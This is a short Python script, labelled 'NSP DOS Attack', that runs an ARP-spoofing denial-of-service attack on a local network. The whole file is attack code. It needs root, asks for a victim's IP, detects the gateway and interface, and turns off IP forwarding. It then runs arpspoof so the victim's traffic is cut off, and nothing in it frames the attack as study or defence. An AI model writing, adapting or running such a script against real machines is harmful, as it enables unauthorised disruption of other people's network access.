import os

os.system('clear')
os.system('figlet NSP DOS Attack')
print ("Made by: Parth Bhavsar\n")
print ("Optimized for Kali Linux. Some of the features of this script might not be available on other distros.\n")

if os.geteuid() != 0:
    exit("The script needs root access to run.\nPlease try again, this time using 'sudo'. Exiting.\n")

veektim = input("Enter the IP of the machine you want to attack: ")
#Gateway = input("Enter the Gateway of the LAN: ")

def GetTheGateway():
	Gateway = os.popen("route | grep default |awk '{print $2}'")
	Gateway = Gateway.read()
	Gateway = Gateway[:-1]
	print ("\nDetected Gateway: ",Gateway)
	chos = input("Is this correct?(Y/N): ")
	if chos == 'N' or chos == 'n':
		Gateway = input("Enter Gateway: ")
	return Gateway

def GetTheInterface():
	Interface = os.popen("route | grep default |awk '{print $8}'")
	Interface = Interface.read()
	Interface = Interface[:-1]
	print ("\nDetected Interface: ",Interface)
	chos = input("Is this correct?(Y/N): ")
	if chos == 'N' or chos == 'n':
		Interface = input("Enter Interface: ")
	return Interface

def attackbegin(intlmao,Victim,gatelmao):
	command11 = "sysctl -w net.ipv4.ip_forward=0" + ">/dev/null 2>&1"
	os.system(command11)
	os.system("sysctl -p")

	#command1 = "arpspoof -i "+ (intlmao) + " -t " + (gatelmao) + " " + (Victim)
	command2 = "arpspoof -i "+ (intlmao) + " -t " + (Victim) + " " + (gatelmao) + ">/dev/null 2>&1"
	print("\nAttack starting...Press Ctrl+C to stop.")
	#print(command2)
	os.system(command2)
	print("\nAttack finished. Victim's access will be restored in a bit.")
	

gate = GetTheGateway()
intr = GetTheInterface()
attackbegin(intr,veektim,gate)


